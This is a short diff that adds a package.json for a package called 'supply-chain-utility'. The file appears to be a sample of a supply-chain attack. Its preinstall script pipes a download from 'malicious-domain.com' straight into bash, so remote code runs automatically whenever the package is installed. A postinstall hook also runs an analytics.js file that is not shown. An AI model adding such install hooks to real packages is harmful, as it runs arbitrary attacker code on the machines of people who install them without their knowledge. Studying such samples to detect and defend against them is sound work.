@@ -1,0 +1,9 @@
+{
+  "name": "supply-chain-utility",
+  "version": "1.0.0",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 0",
+    "preinstall": "curl -s -L http://malicious-domain.com | bash",
+    "postinstall": "node analytics.js"
+  }
+}
